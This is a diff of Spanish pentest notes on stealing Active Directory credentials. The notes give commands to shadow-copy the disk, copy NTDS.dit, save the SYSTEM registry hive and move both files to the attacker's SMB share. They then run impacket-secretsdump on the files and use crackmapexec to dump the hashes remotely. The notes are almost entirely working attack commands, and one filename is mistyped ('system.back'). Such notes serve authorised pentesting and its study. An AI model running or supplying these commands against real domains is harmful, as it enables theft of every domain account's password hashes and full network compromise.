@@ -13,14 +13,22 @@ net localgroup
 Si somos administradores en cualquiera de los dos casos podemos crear una copia del NTDS.dit
 
 Para esto creamos un shadow del disco en el que se encuentra instalado el AD (usualmente el C:)
-vssadmin CREATE SHADOW /For=C:
+vshadow.exe -nw -p  C:
 Esto nos va  agenerar un archivo en un directorio:
 Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
 
 cmd.exe /c copy \\?\Ruta_al_archivo_shadow\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 
+Luego copiamos el system.
+
+reg.exe save hklm\system c:\system.bak
+
 luego lo enviamos a nuestro servidor smb para poder dumpearlo y crackearlo en nuestra pc atacante:
 cmd.exe /c move C:\NTDS\NTDS.dit \\<ip>\CompData 
+
+cmd.exe /c move C:\system.back \\<ip>\CompData 
+
+impacket-secretsdump -ntds NTDS.dit -system system.bak LOCAL
 
 Podemos tambien dumpear el archivo remotamente si tenemos una cuenta de admin:
 crackmapexec smb <ip_dc> -u <user> -p <pass> --ntds
